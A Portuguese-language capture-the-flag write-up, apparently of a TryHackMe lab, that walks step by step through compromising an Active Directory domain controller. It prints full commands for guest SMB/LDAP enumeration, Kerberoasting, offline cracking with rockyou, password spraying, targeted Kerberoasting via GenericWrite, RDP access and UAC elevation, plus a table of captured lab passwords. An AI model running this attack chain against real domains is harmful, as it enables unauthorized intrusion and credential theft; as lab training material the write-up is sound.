

## 1. Reconhecimento e Descoberta do Alvo

O ataque começou com o mapeamento da superfície de ataque do IP `10.48.155.220`. O objetivo era identificar os serviços rodando silenciosamente no servidor.

**Comando utilizado:**

Bash

```
nmap -T4 -n -sC -sV -Pn -p- 10.48.155.220
```

- **Dissecando as flags do Nmap:**
    
    - `-T4`: Acelera a varredura (nível agressivo), sacrificando um pouco a furtividade pela velocidade.
        
    - `-n`: Desabilita a resolução de DNS, poupando tempo ao evitar buscas reversas.             
        
    - `-sC`: Executa os scripts padrões do Nmap, excelentes para enumerar serviços.
        
    - `-sV`: Tenta extrair a versão exata dos serviços rodando nas portas abertas.
        
    - `-Pn`: Ignora a etapa de descoberta de host (ping), forçando a varredura mesmo se o ICMP estiver bloqueado.
        
    - `-p-`: Varre todas as 65.535 portas TCP disponíveis.
        

**Resultados:** As portas 88 (Kerberos), 389/636/3268/3269 (LDAP), 445 (SMB) e 53 (DNS) estavam abertas. Isso carimbou o alvo como um **Domain Controller (DC)**. O hostname revelado foi `ad` e o domínio `thm.local`.

Para que as ferramentas funcionassem perfeitamente, o domínio foi mapeado no arquivo `/etc/hosts` local da máquina atacante:

Plaintext

```
10.48.155.220 ad.thm.local thm.local
```

## 2. Acesso Anônimo (Guest) e Enumeração

Com o alvo mapeado, a próxima etapa foi testar a configuração dos serviços SMB e LDAP em busca de acessos não autenticados ou contas de convidado mal configuradas.

**Verificando compartilhamentos SMB:**

Bash

```
nxc smb ad.thm.local -u 'guest' -p '' --shares
```

**Validando acesso via LDAP:**

Bash

```
nxc ldap ad.thm.local -u 'guest' -p ''
```

**Resultado:** A conta `guest` (com senha em branco) funcionou. O acesso confirmou que o DC rodava Windows Server 2019 (Build 17763).

## 3. O Primeiro Sangue: Kerberoasting via Guest

Como o LDAP permitia leitura com a conta guest, o próximo passo lógico foi caçar contas vulneráveis a **Kerberoasting** (contas de serviço com SPN configurado, cujos tickets podem ser extraídos e quebrados offline).

**Extraindo os tickets (Hashes TGS):**

Bash

```
nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

O ataque foi um sucesso e retornou o hash de ticket Kerberos do usuário `CODY_ROY`.

**Quebrando o Hash (Offline):**

Com o hash no arquivo `kerberoastables.txt`, usei o John the Ripper com a clássica wordlist _rockyou_:

Bash

```
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Credencial Obtida:** `CODY_ROY` : `MKO)mko0`

## 4. Enumeração de Usuários e Password Spraying

Agora com uma conta legítima em mãos, as portas se abriram para enumerar todos os usuários do domínio e descobrir se alguém estava reutilizando a mesma senha.

**Listando todos os usuários do domínio:**

Bash

```
nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users
```

**Filtrando e formatando a saída:**

Para criar uma lista limpa apenas com os nomes de usuários, utilizou-se o poder do bash:

Bash

```
nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | grep "LDAP" | awk '{print $5}' > users.txt
```

- **O que esse comando faz:** O `grep` isola apenas as linhas contendo a palavra "LDAP". O `awk '{print $5}'` recorta apenas a 5ª coluna de texto e o `>` salva tudo de forma limpa dentro de `users.txt`.
    

**Executando o Password Spraying:**

Com a lista de usuários pronta, testei a senha comprometida contra todos eles no SMB:

Bash

```
nxc smb ad.thm.local -u users.txt -p 'MKO)mko0' --continue-on-success
```

**Resultado:** O usuário `ZACHARY_HUNT` estava reutilizando a mesma senha.

**Credencial Obtida:** `ZACHARY_HUNT` : `MKO)mko0`

## 5. Escalada de Privilégios: Abuso de GenericWrite (Targeted Kerberoasting)

Ao mapear as relações do Active Directory visualmente através do **BloodHound**, uma vulnerabilidade de permissão grave foi encontrada: O usuário `ZACHARY_HUNT` possuía direitos de **GenericWrite** sobre a conta de `JERRI_LANCASTER`.

Isso permitiu um **Targeted Kerberoasting**:

**Executando o Targeted Kerberoasting:**

Bash

```
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
```

**Quebrando o novo Hash:**

Bash

```
john jerry --wordlist=/usr/share/wordlists/rockyou.txt
```

**Credencial Obtida:** `JERRI_LANCASTER` : `lovinlife!`

## 6. Pós-Exploração e Acesso Gráfico (RDP)

O BloodHound indicou que `JERRI_LANCASTER` fazia parte do grupo **Remote Desktop Users**, permitindo acesso interativo à interface do Domain Controller.

**Iniciando a sessão RDP:**

Bash

```
xfreerdp3 /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore
```

Com acesso à área de trabalho do servidor, uma pasta suspeita na raiz do disco (`C:\Scripts`) foi investigada. Dentro dela, o script `syncer.ps1` revelou credenciais em texto claro (_hardcoded_).

**Credencial Obtida:** `SANFORD_DAUGHERTY` : `RESET_ASAP123`

## 7. O Pulo do Gato: Login via CMD e Escalada Final (PowerShell Admin)

Com a credencial de Sanford em mãos, não foi necessário abrir uma nova sessão RDP do zero. Por meio da própria área de trabalho da Jerri, um terminal de comando (CMD) foi aberto para autenticar como o novo usuário.

**Logando como Sanford via CMD:**

DOS

```
runas /user:thm.local\sanford_daugherty cmd.exe
```

Foi solicitada a senha (`RESET_ASAP123`), o que abriu uma nova janela de CMD rodando inteiramente sob o contexto do usuário Sanford.

**A Barreira do UAC (Administrator Privilegiado):**

Ao explorar o sistema com o novo terminal, o alvo óbvio foi a pasta do administrador principal para coletar a flag final.

DOS

```
cd C:\Users\Administrator
```

**Resultado:** `Access is denied.`

Neste momento, ficou claro que a pasta do `Administrator` era altamente privilegiada. Embora Sanford fizesse parte do grupo de administradores, o terminal rodava com um _token_ de usuário padrão devido ao **UAC (User Account Control)**. Para ler os arquivos restritos, o terminal precisava ser elevado.

**Executando PowerShell como Administrador:**

Para contornar o acesso negado, um comando foi disparado de dentro do CMD do Sanford para forçar a abertura de um PowerShell elevado (como Administrador):

DOS

```
powershell -Command "Start-Process powershell -Verb RunAs"
```

Como eu estava em uma sessão gráfica (RDP), isso gerou um pop-up do UAC na tela. Bastou confirmar a execução ("Yes") e uma nova janela do PowerShell azul abriu, desta vez com a tag `Administrator` no título.

Com os privilégios máximos no domínio garantidos, o acesso ao diretório `C:\Users\Administrator` foi liberado e o Domain Controller estava 100% comprometido.

### Resumo das Credenciais Capturadas

|**Usuário Alvo**|**Senha**|**Vetor de Ataque Utilizado**|
|---|---|---|
|**CODY_ROY**|`MKO)mko0`|Acesso `guest` LDAP → Kerberoasting Padrão|
|**ZACHARY_HUNT**|`MKO)mko0`|Enumeração de Usuários → Password Spraying|
|**JERRI_LANCASTER**|`lovinlife!`|Abuso de `GenericWrite` → Targeted Kerberoasting|
|**SANFORD_DAUGHERTY**|`RESET_ASAP123`|Leitura de `syncer.ps1` via RDP → Elevação UAC (RunAs)|